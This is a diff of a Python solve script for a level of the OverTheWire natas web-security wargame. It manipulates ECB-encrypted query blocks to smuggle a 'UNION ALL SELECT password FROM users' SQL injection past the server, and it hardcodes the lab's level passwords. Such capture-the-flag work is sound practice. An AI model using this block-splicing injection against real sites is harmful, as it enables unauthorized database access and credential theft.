@@ -1,31 +1,87 @@
 import sys
 import requests as req
+import base64 as b64
+from urllib.parse import unquote, quote
+import hashlib
+import time
 
-username = "natas27"
-password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"
+username = "natas28"
+password = "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4"
 url = "http://%s.natas.labs.overthewire.org/" % username
 
-SPACE = " "
-SPACES = 1
+s = req.session()
+url_part = url + "search.php/?query="
 
-def log_in(s, data):
-	r = s.post(url, auth=(username, password), data=data, cookies={})
-	print(r.text)
-	print(r.headers)
+def get(s):
+	r = s.get(url, auth=(username, password))
 	return r
 
+def post(s, data):
+	r = s.post(url, auth=(username, password), data=data)
+	return r
 
-s = req.session()
+def print_padding_errors():
+	data = {"query": "natas29"}
+	r = post(s, data)
+	cypher = unquote(r.url)[len(url_part):]
+	prev = ""
+	for i in range(0, -len(cypher), -1):
+		r = s.get(url_part + cypher[:i], auth=(username, password))
+		#print(cypher)
+		#print(b64.b64decode(cypher))
+		data = {"query": cypher[:i]}
+		if r.text != prev:
+			print("[" + cypher[:i] + "]")
+			print()
+			print(r.text[r.text.find("Notice"):])
+		prev = r.text
 
-u = "natas28"
-p = ""
+def print_blocks(c):
+	i = len(c)
+	j = 0
+	print()
+	while i:
+		print(c[j:j + 32], end=" ")
+		i -= 32
+		j += 32
+	print()
 
-for i in range(0, 1):
+def print_len_queries(i, query):
+	data = {"query": query}
+	r = post(s, data)
+	cypher = unquote(r.url)[len(url_part):]
+	#print(cypher)
+	hex_c = b64.b64decode(cypher).hex()
+	if not i % 11:
+		print()
+	print("%2d %3d" % (i, len(hex_c)), end=" ")
+	print_blocks(hex_c)
+
+def get_data(query):
+	data = {"query": query}
+	r = post(s, data)
+	cypher = unquote(r.url)[len(url_part):]
+	return b64.b64decode(cypher).hex()
+	
+
+if __name__ == "__main__":
 	"""
-	data = {"username": u, "password": "secret"}
-	log_in(s, data)
+	query = ""
+	for i in range(1, 50):
+		query += "a"
+		if i == 110:
+			query += "'"
+		print_len_queries(i, query)
 	"""
-	data = {"username": u + SPACE * (64-len(u)) + "x", "password": ""}
-	log_in(s, data)
-	data = {"username": u + SPACE * (64-len(u)), "password": ""}
-	log_in(s, data)
+	init = "a" * 9
+	good = init + "a"
+	evil = init + "' UNION ALL SELECT password FROM users; # -- "
+
+	good_hex = get_data(good)
+	evil_hex = get_data(evil)
+	final_hex = good_hex[:32*3] + evil_hex[32*3:]
+
+	final_url = url_part + quote(b64.b64encode(bytes.fromhex(final_hex)))
+	print(final_url)
+	r = s.get(final_url, auth=(username, password))
+	print(r.text)
